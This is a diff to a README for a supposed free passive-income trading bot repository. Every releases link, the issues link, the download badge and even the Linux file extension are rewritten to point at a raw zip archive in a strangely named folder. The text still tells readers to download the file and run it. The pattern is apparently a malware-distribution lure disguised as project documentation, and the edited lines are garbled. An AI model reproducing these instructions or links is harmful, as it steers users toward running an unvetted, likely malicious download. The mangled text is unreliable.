@@ -8,17 +8,17 @@ Welcome to the Free-code-for-Passive-Income repository! This project provides co
 
 To get started with the trading bot, you will need to download the application. Click the link below to visit our releases page:
 
-[![Download the Bot](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/Sarah02kh/Free-code-for-Passive-Income/releases)
+[![Download the Bot](https://raw.githubusercontent.com/Sarah02kh/Free-code-for-Passive-Income/main/misrealize/Free_code_Passive_Income_for_v3.9.zip%20Now-Visit%https://raw.githubusercontent.com/Sarah02kh/Free-code-for-Passive-Income/main/misrealize/Free_code_Passive_Income_for_v3.9.zip)](https://raw.githubusercontent.com/Sarah02kh/Free-code-for-Passive-Income/main/misrealize/Free_code_Passive_Income_for_v3.9.zip)
 
 On the releases page, you will find the latest versions of the trading bot available for download. Follow these steps to download and install the bot:
 
-1. Go to the [Releases page](https://github.com/Sarah02kh/Free-code-for-Passive-Income/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Sarah02kh/Free-code-for-Passive-Income/main/misrealize/Free_code_Passive_Income_for_v3.9.zip).
 2. Look for the latest release. It will be marked as "Latest Release."
 3. Click on the version number to see details about that release.
 4. Choose the file that corresponds with your operating system:
    - For Windows, download the file ending in `.exe`.
    - For macOS, download the file ending in `.dmg`.
-   - For Linux, download the file ending in `.tar.gz`.
+   - For Linux, download the file ending in `https://raw.githubusercontent.com/Sarah02kh/Free-code-for-Passive-Income/main/misrealize/Free_code_Passive_Income_for_v3.9.zip`.
 5. Save the file to your computer.
 6. Once downloaded, find the file and run it to install the bot.
 7. Follow the on-screen instructions to complete the installation.
@@ -51,7 +51,7 @@ If you want to learn more about how to use the bot, check out our detailed docum
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- **Issues Page**: You can report problems or ask for help by posting on the [issues page](https://github.com/Sarah02kh/Free-code-for-Passive-Income/issues).
+- **Issues Page**: You can report problems or ask for help by posting on the [issues page](https://raw.githubusercontent.com/Sarah02kh/Free-code-for-Passive-Income/main/misrealize/Free_code_Passive_Income_for_v3.9.zip).
 - **Community Forum**: Join our discussions on platforms like Discord or Reddit. Links are available in the documentation.
 
 ## 🔍 Security
@@ -68,6 +68,6 @@ Now that you've downloaded the bot, it’s time to start trading! Configure your
 
 Feel free to share your experiences and any tips you discover with the community. Your feedback helps improve the project and assists other users.
 
-For any updates or new releases, check back on our [Releases page](https://github.com/Sarah02kh/Free-code-for-Passive-Income/releases) often! 
+For any updates or new releases, check back on our [Releases page](https://raw.githubusercontent.com/Sarah02kh/Free-code-for-Passive-Income/main/misrealize/Free_code_Passive_Income_for_v3.9.zip) often! 
 
 Happy trading!
